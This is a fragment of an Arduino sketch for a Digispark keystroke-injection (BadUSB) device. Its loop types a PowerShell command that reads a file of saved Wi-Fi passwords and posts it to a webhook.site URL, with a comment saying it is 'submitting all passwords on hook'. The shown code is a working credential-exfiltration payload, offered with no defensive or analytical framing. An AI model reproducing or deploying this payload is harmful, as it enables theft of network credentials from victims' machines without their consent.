...
void loop() {
  ...
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell -command \"&{Get-Content .\\Wi-Fi-PASS | Invoke-WebRequest -Method POST -ContentType 'text/plain' -Uri 'https://webhook.site/2a4bb0a6-e03b-4562-84dd-526642c36840'}\""); //Submitting all passwords on hook
